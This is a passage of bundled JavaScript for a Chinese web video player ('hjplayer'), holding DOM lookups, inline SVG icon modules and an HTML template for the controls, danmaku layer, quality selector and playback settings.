						this.controllerMask = this.container.querySelector(".hjplayer-controller-mask");
						this.ptime = this.container.querySelector(".hjplayer-ptime");
						this.dtime = this.container.querySelector(".hjplayer-dtime");
						this.controller = this.container.querySelector(".hjplayer-controller");
						// ========== 设置面板相关DOM元素 ==========
						this.settingButton = this.container.querySelector(".hjplayer-setting-icon");
						this.settingBox = this.container.querySelector(".hjplayer-setting-box");
						this.mask = this.container.querySelector(".hjplayer-mask");
						// ========== 循环设置相关DOM元素 ==========
						this.loop = this.container.querySelector(".hjplayer-setting-loop");
						this.loopToggle = this.container.querySelector(
							".hjplayer-setting-loop .hjplayer-toggle-setting-input");
						// ========== 弹幕设置相关DOM元素 ==========
						this.showDanmaku = this.container.querySelector(".hjplayer-setting-showdan");
						this.showDanmakuToggle = this.container.querySelector(
							".hjplayer-showdan-setting-input");
						this.unlimitDanmaku = this.container.querySelector(".hjplayer-setting-danunlimit");
						this.unlimitDanmakuToggle = this.container.querySelector(
							".hjplayer-danunlimit-setting-input");
						// ========== 播放速度相关DOM元素 ==========
						this.speed = this.container.querySelector(".hjplayer-setting-speed");
						this.speedItem = this.container.querySelectorAll(".hjplayer-setting-speed-item");
						// ========== 评论/发送弹幕相关DOM元素 ==========
						this.commentInput = this.container.querySelector(".hjplayer-comment-input");
						this.commentButton = this.container.querySelector(".hjplayer-comment-icon");
						this.yzmcomment = this.container.querySelector(".hj-hjplayer-comment-input");
						this.commentSettingBox = this.container.querySelector(
							".hjplayer-comment-setting-box");
						this.commentSettingButton = this.container.querySelector(
							".hjplayer-comment-setting-icon");
						this.commentSettingFill = this.container.querySelector(
							".hjplayer-comment-setting-icon path");
						this.commentSendButton = this.container.querySelector(".hjplayer-send-icon");
						this.commentSendFill = this.container.querySelector(".hjplayer-send-icon path");
						this.commentColorSettingBox = this.container.querySelector(
							".hjplayer-comment-setting-color");
						// ========== 全屏相关DOM元素 ==========
						this.browserFullButton = this.container.querySelector(".hjplayer-full-icon");
						this.webFullButton = this.container.querySelector(".hjplayer-full-in-icon");
						// ========== 菜单相关DOM元素 ==========
						this.menu = this.container.querySelector(".hjplayer-menu");
						this.menuItem = this.container.querySelectorAll(".hjplayer-menu-item");
						// ========== 画质相关DOM元素 ==========
						this.qualityList = this.container.querySelector(".hjplayer-quality-list");
						this.qualityButton = this.container.querySelector(".hjplayer-quality-icon");
						// ========== 其他功能按钮DOM元素 ==========
						this.camareButton = this.container.querySelector(".hjplayer-camera-icon");
						this.subtitleButton = this.container.querySelector(".hjplayer-subtitle-icon");
						this.subtitleButtonInner = this.container.querySelector(
							".hjplayer-subtitle-icon .hjplayer-icon-content");
						this.subtitle = this.container.querySelector(".hjplayer-subtitle");
						// ========== 提示与信息面板相关DOM元素 ==========
						this.notice = this.container.querySelector(".hjplayer-notice");
						this.infoPanel = this.container.querySelector(".hjplayer-info-panel");
						this.infoPanelClose = this.container.querySelector(".hjplayer-info-panel-close");
						this.infoVersion = this.container.querySelector(
							".hjplayer-info-panel-item-version .hjplayer-info-panel-item-data");
						this.infoFPS = this.container.querySelector(
							".hjplayer-info-panel-item-fps .hjplayer-info-panel-item-data");
						this.infoType = this.container.querySelector(
							".hjplayer-info-panel-item-type .hjplayer-info-panel-item-data");
						this.infoUrl = this.container.querySelector(
							".hjplayer-info-panel-item-url .hjplayer-info-panel-item-data");
						this.infoResolution = this.container.querySelector(
							".hjplayer-info-panel-item-resolution .hjplayer-info-panel-item-data");
						this.infoDuration = this.container.querySelector(
							".hjplayer-info-panel-item-duration .hjplayer-info-panel-item-data");
						this.infoDanmakuId = this.container.querySelector(
							".hjplayer-info-panel-item-danmaku-id .hjplayer-info-panel-item-data");
						this.infoDanmakuApi = this.container.querySelector(
							".hjplayer-info-panel-item-danmaku-api .hjplayer-info-panel-item-data");
						this.infoDanmakuAmount = this.container.querySelector(
							".hjplayer-info-panel-item-danmaku-amount .hjplayer-info-panel-item-data");
					}
				}
				// 8. 使用类装饰器定义类（保持原逻辑一致）
				const DecoratedHjPlayer = classDecorator(HjPlayer, [{
					key: "init",
					value: HjPlayer.prototype.init
				}]);
				// 9. 导出默认模块（与原代码导出逻辑一致）
				t.default = DecoratedHjPlayer;
			},

			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M17.982 9.275L8.06 3.27A2.013 2.013 0 005 4.994v12.011a2.017 2.017 0 003.06 1.725l9.922-6.005a2.017 2.017 0 000-3.45z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M7 3a2 2 0 00-2 2v12a2 2 0 104 0V5a2 2 0 00-2-2zM15 3a2 2 0 00-2 2v12a2 2 0 104 0V5a2 2 0 00-2-2z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M10.188 4.65L6 8H5a2 2 0 00-2 2v2a2 2 0 002 2h1l4.188 3.35a.5.5 0 00.812-.39V5.04a.498.498 0 00-.812-.39zM14.446 3.778a1 1 0 00-.862 1.804 6.002 6.002 0 01-.007 10.838 1 1 0 00.86 1.806A8.001 8.001 0 0019 11a8.001 8.001 0 00-4.554-7.222z"></path><path d="M15 11a3.998 3.998 0 00-2-3.465v6.93A3.998 3.998 0 0015 11z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M10.188 4.65L6 8H5a2 2 0 00-2 2v2a2 2 0 002 2h1l4.188 3.35a.5.5 0 00.812-.39V5.04a.498.498 0 00-.812-.39zM14.446 3.778a1 1 0 00-.862 1.804 6.002 6.002 0 01-.007 10.838 1 1 0 00.86 1.806A8.001 8.001 0 0019 11a8.001 8.001 0 00-4.554-7.222z"></path><path d="M15 11a3.998 3.998 0 00-2-3.465v6.93A3.998 3.998 0 0015 11z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M15 11a3.998 3.998 0 00-2-3.465v2.636l1.865 1.865A4.02 4.02 0 0015 11z"></path><path d="M13.583 5.583A5.998 5.998 0 0117 11a6 6 0 01-.585 2.587l1.477 1.477a8.001 8.001 0 00-3.446-11.286 1 1 0 00-.863 1.805zM18.778 18.778l-2.121-2.121-1.414-1.414-1.415-1.415L13 13l-2-2-3.889-3.889-3.889-3.889a.999.999 0 10-1.414 1.414L5.172 8H5a2 2 0 00-2 2v2a2 2 0 002 2h1l4.188 3.35a.5.5 0 00.812-.39v-3.131l2.587 2.587-.01.005a1 1 0 00.86 1.806c.215-.102.424-.214.627-.333l2.3 2.3a1.001 1.001 0 001.414-1.416zM11 5.04a.5.5 0 00-.813-.39L8.682 5.854 11 8.172V5.04z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" version="1.1" viewBox="0 0 1024 1024"><path class="hjplayer-fill" style="fill:#ffffff" d="M172.76790012 458.3867064c-16.56714924 0-30.76756226-13.41150166-30.76756226-30.76756226V276.93697895C142.00033786 205.93491169 182.23484286 163.33367119 249.29235047 163.33367119h148.31542969c16.56714924 0 30.76756226 13.41150166 30.76756298 30.76756226s-13.41150166 30.76756226-30.76756298 30.76756228H250.08126254c-28.40082677 0-46.54579943 8.67803065-46.54580015 52.8570953v150.68216519c0 15.77823717-14.20041374 29.97865091-30.76756227 29.97865018z m597.99518975 441.79064149H622.44766018c-16.56714924 0-29.97865091-13.41150166-29.97865019-29.97865019s13.41150166-29.97865091 29.97865019-29.9786509h148.31542969c28.40082677 0 46.54579943-8.67803065 46.54580016-52.85709459V635.89187494c0-16.56714924 13.41150166-29.97865091 29.97865019-29.97865019s29.97865091 13.41150166 29.97865092 29.97865019v150.68216518c0.78891208 71.00206727-39.44559292 113.60330777-106.50310127 113.60330777z" id="hjplayer-full"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg id="yemian"xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M18 4H4a2 2 0 00-2 2v10a2 2 0 002 2h14a2 2 0 002-2V6a2 2 0 00-2-2zM8 15.5a.5.5 0 01-.5.5h-3a.5.5 0 01-.5-.5v-3a.5.5 0 01.5-.5h1a.5.5 0 01.5.5V14h1.5a.5.5 0 01.5.5v1zm0-8a.5.5 0 01-.5.5H6v1.5a.5.5 0 01-.5.5h-1a.5.5 0 01-.5-.5v-3a.5.5 0 01.5-.5h3a.5.5 0 01.5.5v1zm10 8a.5.5 0 01-.5.5h-3a.5.5 0 01-.5-.5v-1a.5.5 0 01.5-.5H16v-1.5a.5.5 0 01.5-.5h1a.5.5 0 01.5.5v3zm0-6a.5.5 0 01-.5.5h-1a.5.5 0 01-.5-.5V8h-1.5a.5.5 0 01-.5-.5v-1a.5.5 0 01.5-.5h3a.5.5 0 01.5.5v3z"></path></svg><svg id="tuichuuyemian" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M18 4H4a2 2 0 00-2 2v10a2 2 0 002 2h14a2 2 0 002-2V6a2 2 0 00-2-2zM8 15.5a.5.5 0 01-.5.5h-1a.5.5 0 01-.5-.5V14H4.5a.5.5 0 01-.5-.5v-1a.5.5 0 01.5-.5h3a.5.5 0 01.5.5v3zm0-6a.5.5 0 01-.5.5h-3a.5.5 0 01-.5-.5v-1a.5.5 0 01.5-.5H6V6.5a.5.5 0 01.5-.5h1a.5.5 0 01.5.5v3zm10 4a.5.5 0 01-.5.5H16v1.5a.5.5 0 01-.5.5h-1a.5.5 0 01-.5-.5v-3a.5.5 0 01.5-.5h3a.5.5 0 01.5.5v1zm0-4a.5.5 0 01-.5.5h-3a.5.5 0 01-.5-.5v-3a.5.5 0 01.5-.5h1a.5.5 0 01.5.5V8h1.5a.5.5 0 01.5.5v1z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><circle cx="11" cy="11" r="2"></circle><path d="M19.164 8.861L17.6 8.6a6.978 6.978 0 00-1.186-2.099l.574-1.533a1 1 0 00-.436-1.217l-1.997-1.153a1.001 1.001 0 00-1.272.23l-1.008 1.225a7.04 7.04 0 00-2.55.001L8.716 2.829a1 1 0 00-1.272-.23L5.447 3.751a1 1 0 00-.436 1.217l.574 1.533A6.997 6.997 0 004.4 8.6l-1.564.261A.999.999 0 002 9.847v2.306c0 .489.353.906.836.986l1.613.269a7 7 0 001.228 2.075l-.558 1.487a1 1 0 00.436 1.217l1.997 1.153c.423.244.961.147 1.272-.23l1.04-1.263a7.089 7.089 0 002.272 0l1.04 1.263a1 1 0 001.272.23l1.997-1.153a1 1 0 00.436-1.217l-.557-1.487c.521-.61.94-1.31 1.228-2.075l1.613-.269a.999.999 0 00.835-.986V9.847a.999.999 0 00-.836-.986zM11 15a4 4 0 110-8 4 4 0 010 8z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M22 16l-10.105-10.6-1.895 1.987 8.211 8.613-8.211 8.612 1.895 1.988 8.211-8.613z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" version="1.1" viewBox="0 0 1024 1024"><path class="hjplayer-fill" style="fill:#ffffff" d="M634.307692 358.53846172H341.23076914c-24.23076943 0-45-19.61538487-45-45S315.84615401 269.69230742 341.23076914 269.69230742h293.07692285c24.23076943 0 43.84615342 19.61538487 43.84615429 45s-19.61538487 43.84615342-43.84615429 43.8461543z m-74.99999971 159.23076943c0-24.23076943-19.61538487-45-45-45H328.53846113c-24.23076943 0-45 19.61538487-45 45s19.61538487 45 45 45h186.92307773c24.23076943-1.15384658 43.84615342-20.76923057 43.84615343-45zM520.07692344 835.07692344c0-23.07692285-18.46153828-42.69230771-42.69230772-42.69230771H252.38461573c-54.23076914 0-96.92307685-47.30769229-96.92307686-106.15384688v-426.92307627c0-58.84615371 43.84615342-106.15384599 96.92307685-106.153846h630c54.23076914 0 96.92307685 47.30769229 96.92307686 106.153846v94.61538456c0 23.07692285 18.46153828 42.69230771 42.69230771 42.69230773s42.69230771-18.46153828 42.69230772-42.69230773v-94.61538456C1064.69230801 154.30769229 982.76923057 68.92307685 882.38461573 68.92307685H252.38461573C153.15384658 68.92307685 71.23076914 154.30769229 71.23076914 259.30769258v428.07692285c0 105.00000029 81.92307656 190.38461573 181.15384658 190.38461572H477.38461573c24.23076943 0 42.69230771-19.61538487 42.69230771-42.69230771z m323.07692255-521.53846172c0-27.69230742-23.07692285-50.76923115-50.76923026-50.76923115s-50.76923115 23.07692285-50.76923116 50.76923115 23.07692285 50.76923115 50.76923116 50.76923028c28.84615401 0 50.76923115-23.07692285 50.76923026-50.76923028m255.00000059 377.3076917c0-148.84615372-121.15384629-270-268.84615429-270S559.30769229 541.99999971 559.30769229 690.84615342s121.15384629 268.84615342 270 268.84615429 268.84615342-119.99999971 268.84615429-268.84615429z m-87.69230772 0c0 99.23076914-80.76923086 181.15384658-181.15384657 181.15384658s-181.15384658-80.76923086-181.15384571-181.15384658 80.76923086-180 181.15384571-180 181.15384658 80.76923086 181.15384657 180z m-167.30769287 114.23076944l170.76923086-184.61538458c15.00000029-16.15384599 13.84615371-41.53846114-2.30769228-56.53846143-16.15384599-15.00000029-41.53846114-13.84615371-56.53846142 2.30769229L807.38461513 724.307692 731.23076885 672.38461513c-18.46153828-12.69230801-42.69230771-8.07692344-55.38461484 10.38461573-12.69230801 18.46153828-8.07692344 42.69230771 10.38461484 55.38461572l106.15384687 72.69230743c6.92307685 4.61538457 15.00000029 6.92307685 23.07692285 6.92307685 9.23076914 0 19.61538487-4.61538457 27.69230742-12.69230801z" id="hjplayer-comment"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M27.090 0.131h-22.731c-2.354 0-4.262 1.839-4.262 4.109v16.401c0 2.269 1.908 4.109 4.262 4.109h4.262v-2.706h8.469l-8.853 8.135 1.579 1.451 7.487-6.88h9.787c2.353 0 4.262-1.84 4.262-4.109v-16.401c0-2.27-1.909-4.109-4.262-4.109v0zM28.511 19.304c0 1.512-1.272 2.738-2.841 2.738h-8.425l-0.076-0.070-0.076 0.070h-11.311c-1.569 0-2.841-1.226-2.841-2.738v-13.696c0-1.513 1.272-2.739 2.841-2.739h19.889c1.569 0 2.841-0.142 2.841 1.37v15.064z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 1048 1024"><path d="M675.48206831 405.43059956c-21.34102395 0-38.61709113-17.27606717-38.61709114-38.61709114 0-21.34102395 17.27606717-38.61709113 38.61709113-38.6170903s38.61709113 17.27606717 38.6170903 38.6170903c0 21.34102395-17.27606717 38.61709113-38.6170903 38.61709114M825.88547437 93.44515543c-1.0162392 0-3.04871759 1.0162392-4.06495679 1.0162392L171.42740857 347.50496286c-32.51965512 9.14615277-57.92563586 35.56837271-67.07178864 68.08802865-9.14615277 34.55213351 0 69.10426785 25.40598074 94.5102486 5.08119598 5.08119598 11.17863116 8.12991357 18.29230555 10.1623928L284.22996353 557.86648401l104.67264139 30.48717673c48.77948309-45.7307655 144.30597089-134.14357891 159.54955883-148.37092768 15.24358878-15.24358878 39.63333032-15.24358878 54.87691911 0 15.24358878 15.24358878 15.24358878 39.63333032 0 54.87691911-18.29230637 18.29230637-132.11110052 123.98118613-157.51708127 147.35468847L498.65644147 883.06303852c2.03247839 7.11367438 5.08119598 14.22734958 10.16239279 19.30854556 18.29230637 18.29230637 42.68204792 28.45469834 69.10426703 28.45469833 8.12991357 0 17.27606717-1.0162392 25.40598157-3.04871759 33.53589431-9.14615277 58.94187506-33.53589431 68.08802783-66.05555026L943.76922531 218.44258075c1.0162392-2.03247839 1.0162392-3.04871759 2.0324784-5.08119598 9.14615277-34.55213351 0-69.10426785-25.40598074-94.5102486C894.98974222 94.46139462 860.43760788 84.29900183 825.88547437 93.44515543z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M16.5 8c1.289 0 2.49.375 3.5 1.022V6a2 2 0 00-2-2H4a2 2 0 00-2 2v10a2 2 0 002 2h7.022A6.5 6.5 0 0116.5 8zM7 13H5a1 1 0 010-2h2a1 1 0 010 2zm2-4H5a1 1 0 010-2h4a1 1 0 010 2z"></path><path d="M20.587 13.696l-.787-.131a3.503 3.503 0 00-.593-1.051l.301-.804a.46.46 0 00-.21-.56l-1.005-.581a.52.52 0 00-.656.113l-.499.607a3.53 3.53 0 00-1.276 0l-.499-.607a.52.52 0 00-.656-.113l-1.005.581a.46.46 0 00-.21.56l.301.804c-.254.31-.456.665-.593 1.051l-.787.131a.48.48 0 00-.413.465v1.209a.48.48 0 00.413.465l.811.135c.144.382.353.733.614 1.038l-.292.78a.46.46 0 00.21.56l1.005.581a.52.52 0 00.656-.113l.515-.626a3.549 3.549 0 001.136 0l.515.626a.52.52 0 00.656.113l1.005-.581a.46.46 0 00.21-.56l-.292-.78c.261-.305.47-.656.614-1.038l.811-.135A.48.48 0 0021 15.37v-1.209a.48.48 0 00-.413-.465zM16.5 16.057a1.29 1.29 0 11.002-2.582 1.29 1.29 0 01-.002 2.582z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M16 23c-3.309 0-6-2.691-6-6s2.691-6 6-6 6 2.691 6 6-2.691 6-6 6zM16 13c-2.206 0-4 1.794-4 4s1.794 4 4 4c2.206 0 4-1.794 4-4s-1.794-4-4-4zM27 28h-22c-1.654 0-3-1.346-3-3v-16c0-1.654 1.346-3 3-3h3c0.552 0 1 0.448 1 1s-0.448 1-1 1h-3c-0.551 0-1 0.449-1 1v16c0 0.552 0.449 1 1 1h22c0.552 0 1-0.448 1-1v-16c0-0.551-0.448-1-1-1h-11c-0.552 0-1-0.448-1-1s0.448-1 1-1h11c1.654 0 3 1.346 3 3v16c0 1.654-1.346 3-3 3zM24 10.5c0 0.828 0.672 1.5 1.5 1.5s1.5-0.672 1.5-1.5c0-0.828-0.672-1.5-1.5-1.5s-1.5 0.672-1.5 1.5zM15 4c0 0.552-0.448 1-1 1h-4c-0.552 0-1-0.448-1-1v0c0-0.552 0.448-1 1-1h4c0.552 0 1 0.448 1 1v0z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M26.667 5.333h-21.333c-0 0-0.001 0-0.001 0-1.472 0-2.666 1.194-2.666 2.666 0 0 0 0.001 0 0.001v-0 16c0 0 0 0.001 0 0.001 0 1.472 1.194 2.666 2.666 2.666 0 0 0.001 0 0.001 0h21.333c0 0 0.001 0 0.001 0 1.472 0 2.666-1.194 2.666-2.666 0-0 0-0.001 0-0.001v0-16c0-0 0-0.001 0-0.001 0-1.472-1.194-2.666-2.666-2.666-0 0-0.001 0-0.001 0h0zM5.333 16h5.333v2.667h-5.333v-2.667zM18.667 24h-13.333v-2.667h13.333v2.667zM26.667 24h-5.333v-2.667h5.333v2.667zM26.667 18.667h-13.333v-2.667h13.333v2.667z"></path></svg>'
			},
			function(e, t) {
				e.exports =
					'<svg version="1.1" viewBox="0 0 22 22"><svg x="7" y="1"><circle class="diplayer-loading-dot diplayer-loading-dot-0" cx="4" cy="4" r="2"></circle></svg><svg x="11" y="3"><circle class="diplayer-loading-dot diplayer-loading-dot-1" cx="4" cy="4" r="2"></circle></svg><svg x="13" y="7"><circle class="diplayer-loading-dot diplayer-loading-dot-2" cx="4" cy="4" r="2"></circle></svg><svg x="11" y="11"><circle class="diplayer-loading-dot diplayer-loading-dot-3" cx="4" cy="4" r="2"></circle></svg><svg x="7" y="13"><circle class="diplayer-loading-dot diplayer-loading-dot-4" cx="4" cy="4" r="2"></circle></svg><svg x="3" y="11"><circle class="diplayer-loading-dot diplayer-loading-dot-5" cx="4" cy="4" r="2"></circle></svg><svg x="1" y="7"><circle class="diplayer-loading-dot diplayer-loading-dot-6" cx="4" cy="4" r="2"></circle></svg><svg x="3" y="3"><circle class="diplayer-loading-dot diplayer-loading-dot-7" cx="4" cy="4" r="2"></circle></svg></svg>'
			},
			function(e, t, n) {
				// 引入依赖模块
				const utils = n(3);
				e.exports = function(options) {
					// 初始化参数，避免空值
					options = options || {};
					// 解构赋值，明确变量含义，替代原代码的零散变量声明
					const {
						video: videoConfig,
						options: playerOptions,
						tran: translate,
						icons: iconConfig,
						index: playerIndex,
						$value, // 保留原代码未使用的变量，保证功能一致
						$index // 保留原代码未使用的变量，保证功能一致
					} = options;
					// 提取工具方法，简化后续调用
					const $escape = utils.$escape;
					const $each = utils.$each;
					let htmlStr = '';
					// 1. 拼接加载弹窗和遮罩层 HTML
					htmlStr +=
						'<div id="loading-box"><div class="loading"><p class="pic"></p><div class="tips"></div></div><div type="button" id="close"><div class="playlink"><span id="link1">播放器连接...</span><span id="link1-success">【完成】</span></div><div class="dmlink"><span id="link2">弹幕连接中...</span><span id="link2-success">【完成】</span><span id="link2-error">【失败】</span></div><span class="palycon" id="link3"><e id="link3_tip">等待视频连接中</e><e id="link3-error">【失败】</e><!--d class="wait"><e id="span">3</e>s</d--></span></div></div><div class="hjplayer-mask"></div><div class="hjplayer-cplayer"><div class="hjplayer-showing"><svg aria-hidden="true"><use xlink:href="#icon-play"></use></svg></div><div class="vod-title"><div id="landing-title" class="video-info"><ul class="u-title"><a id="vodlink" href="" target="_blank"><span class="iconfont icon-back"></span></a><a id="vodtitle"><span></span></a></ul></div></div></div><div class="hjplayer-video-wrap">';
					// 2. 拼接视频核心内容（调用 n(4) 方法）
					(function(videoHtml) {
						htmlStr += videoHtml;
					})(n(4)(videoConfig));
					// 3. 拼接播放器 Logo（按需显示）
					if (playerOptions.logo) {
						htmlStr += '<div class="hjplayer-logo"><img src="' + $escape(playerOptions.logo) +
							'"></div>';
					}
					// 4. 拼接弹幕容器
					let danmakuStyle = '';
					if (playerOptions.danmaku && playerOptions.danmaku.bottm) {
						danmakuStyle = ` style="margin-bottom:${$escape(playerOptions.danmaku.bottm)}"`;
					}
					htmlStr += `
    <div class="hjplayer-danmaku"${danmakuStyle}>
        <div class="hjplayer-danmaku-item hjplayer-danmaku-item--demo"></div>
    </div>
    <div class="hjplayer-subtitle"></div>
    <div class="hjplayer-bezel">
        <span class="hjplayer-bezel-icon"></span>
        `;
					// 5. 拼接弹幕加载提示（按需显示）
					if (playerOptions.danmaku) {
						htmlStr += `
        <span class="hjplayer-danloading">${$escape(translate("Danmaku is loading"))}</span>
        `;
					}
					// 6. 拼接加载图标
					htmlStr += `
        <span class="diplayer-loading-icon">${iconConfig.loading}</span>
    </div>
</div>
<div class="hjplayer-controller-mask"></div>
<div class="hjplayer-controller">
  <div class="controller-box">
   <div class="hjplayer-icons hjplayer-icons-left">
        <button class="hjplayer-icon hjplayer-play-icon">
            <span class="hjplayer-icon-content">${iconConfig.play}</span>
        </button>
    <button onclick="HJPlayer.video.next();" class="hjplayer-icon  icon-xj" data-balloon="下一集" data-balloon-pos="up">
        <span class="hjplayer-icon-content">
            <svg aria-hidden="true" fill="#fff">
                <use xlink:href="#icon-play-xj"></use>
            </svg>
        </span>
    </button>
    <div class="hjplayer-volume">
        <button class="hjplayer-icon hjplayer-volume-icon">
            <span class="hjplayer-icon-content">${iconConfig.volumeDown}</span>
        </button>
        <div class="hjplayer-volume-bar-wrap" data-balloon-pos="up">
            <div class="hjplayer-volume-bar">
                <div class="hjplayer-volume-bar-inner" style="background: ${$escape(playerOptions.theme)};">
                    <span class="hjplayer-thumb" style="background: ${$escape(playerOptions.theme)}"></span>
                </div>
            </div>
        </div>
    </div>
    <span class="hjplayer-time">
        <span class="hjplayer-ptime">0:00</span> /
        <span class="hjplayer-dtime">0:00</span>
    </span>
        `;
					// 7. 拼接直播标识（按需显示）
					if (playerOptions.live) {
						htmlStr += `
        <span class="hjplayer-live-badge">
            <span class="hjplayer-live-dot" style="background: ${$escape(playerOptions.theme)};"></span>
            ${$escape(translate("Live"))}
        </span>
        `;
					}
					// 8. 拼接右侧控制器（开始）
					htmlStr += `
    </div>
    <div class="hjplayer-icons hjplayer-icons-right">
        `;
					// 9. 拼接画质选择器（按需显示）
					if (playerOptions.video.quality) {
						htmlStr += `
        <div class="hjplayer-quality">
            <button class="hjplayer-icon hjplayer-quality-icon">
                ${$escape(playerOptions.video.quality[playerOptions.video.defaultQuality].name)}
            </button>
            <div class="hjplayer-quality-mask">
                <div class="hjplayer-quality-list"></div>
        `;
						// 遍历画质选项
						$each(playerOptions.video.quality, function(qualityItem, idx) {
							htmlStr += `
                    <div class="hjplayer-quality-item" data-index="${$escape(idx)}">
                        ${$escape(qualityItem.name)}
                    </div>
                `;
						});
						htmlStr += `
                </div>
            </div>
        </div>
        `;
					}
					// 10. 拼接截图按钮（按需显示）
					if (playerOptions.screenshot) {
						htmlStr += `
        <a href="#" class="hjplayer-icon hjplayer-camera-icon" 
           data-balloon="${$escape(translate("Screenshot"))}" data-balloon-pos="up">
            <span class="hjplayer-icon-content">${iconConfig.camera}</span>
        </a>
        `;
					}
					// 11. 拼接弹幕发送按钮
					htmlStr += `
        <div class="hjplayer-comment">
            <button class="hjplayer-icon hjplayer-comment-icon" 
                    data-balloon="${$escape(translate("Send danmaku"))}" data-balloon-pos="up">
                <span class="hjplayer-icon-content">${iconConfig.comment}</span>
            </button>
        </div>
        `;
					// 12. 拼接字幕按钮（按需显示）
					if (playerOptions.subtitle) {
						htmlStr += `
        <div class="hjplayer-subtitle-btn">
            <button class="hjplayer-icon hjplayer-subtitle-icon" 
                    data-balloon="${$escape(translate("Hide subtitle"))}" data-balloon-pos="up">
                <span class="hjplayer-icon-content">${iconConfig.subtitle}</span>
            </button>
        </div>
        `;
					}
					// 13. 拼接设置面板（倍速、循环、跳过片头片尾等）
					htmlStr += `
        <div class="hjplayer-setting">
            <button class="hjplayer-icon hjplayer-setting-speeds" data-balloon="速度" data-balloon-pos="up">
                <span class="hjplayer-label title">倍速</span>
                <div class="hjplayer-setting-speed-panel speed-stting">
                    <div class="hjplayer-setting-speed-item" data-speed="0.5"><span class="hjplayer-label">0.5x</span></div>
                    <div class="hjplayer-setting-speed-item" data-speed="0.75"><span class="hjplayer-label">0.75x</span></div>
                    <div class="hjplayer-setting-speed-item" data-speed="1"><span class="hjplayer-label">正常</span></div>
                    <div class="hjplayer-setting-speed-item" data-speed="1.25"><span class="hjplayer-label">1.25x</span></div>
                    <div class="hjplayer-setting-speed-item" data-speed="1.5"><span class="hjplayer-label">1.5x</span></div>
                    <div class="hjplayer-setting-speed-item" data-speed="2"><span class="hjplayer-label">2.0x</span></div>
                </div>
            </button>
            <button class="hjplayer-icon hjplayer-list-icon" data-balloon="弹幕列表" data-balloon-pos="up">
                <span class="hjplayer-icon-content">
                    <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" version="1.1" viewBox="0 0 32 32">
                        <path class="hjplayer-fill" style="fill:#ffffff" d="M26.667 5.333h-21.333c-0 0-0.001 0-0.001 0-1.472 0-2.666 1.194-2.666 2.666 0 0 0 0.001 0 0.001v-0 16c0 0 0 0.001 0 0.001 0 1.472 1.194 2.666 2.666 2.666 0 0 0.001 0 0.001 0h21.333c0 0 0.001 0 0.001 0 1.472 0 2.666-1.194 2.666-2.666 0-0 0-0.001 0-0.001v0-16c0-0 0-0.001 0-0.001 0-1.472-1.194-2.666-2.666-2.666-0 0-0.001 0-0.001 0h0zM5.333 16h5.333v2.667h-5.333v-2.667zM18.667 24h-13.333v-2.667h13.333v2.667zM26.667 24h-5.333v-2.667h5.333v2.667zM26.667 18.667h-13.333v-2.667h13.333v2.667z" id="hjplayer-full-in"></path>
                    </svg>
                </span>
            </button>
            <button class="hjplayer-icon hjplayer-setting-icon" 
                    data-balloon="${$escape(translate("Setting"))}" data-balloon-pos="up">
                <span class="hjplayer-icon-content">${iconConfig.setting}</span>
            </button>
            <div class="hjplayer-setting-box">
                <div class="hjplayer-setting-origin-panel">
                    <div class="hjplayer-setting-item hjplayer-setting-speed">
                        <span class="hjplayer-label">${$escape(translate("Speed"))}</span>
                        <div class="hjplayer-toggle">${iconConfig.right}</div>
                    </div>
                    <div class="hjplayer-setting-item hjplayer-setting-loop">
                        <span class="hjplayer-label">${$escape(translate("Loop"))}</span>
                        <div class="hjplayer-toggle">
                            <input class="hjplayer-toggle-setting-input" type="checkbox" name="hjplayer-toggle">
                            <label for="hjplayer-toggle"></label>
                        </div>
                    </div>
                    <div class="hjplayer-setting-item hjplayer-setting-jlast">
                        <span class="hjplayer-label">跳过片尾 <input id="jumptime" placeholder="单位/秒"></span>
                        <div class="hjplayer-toggle">
                            <input class="hjplayer-toggle-setting-input" type="checkbox" name="hjplayer-toggle">
                            <label for="hjplayer-toggle"></label>
                        </div>
                    </div>
                    <div class="hjplayer-setting-item hjplayer-setting-jfrist">
                        <span class="hjplayer-label">跳过片头 <input id="fristtime" placeholder="单位/秒"></span>
                        <div class="hjplayer-toggle">
                            <input class="hjplayer-toggle-setting-input" type="checkbox" name="hjplayer-toggle">
                            <label for="hjplayer-toggle"></label>
                        </div>
                    </div>
                </div>
                <div class="hjplayer-setting-speed-panel">
                    <div class="hjplayer-setting-speed-item" data-speed="0.5">
                        <span class="hjplayer-label">0.5</span>
                    </div>
                    <div class="hjplayer-setting-speed-item" data-speed="0.75">
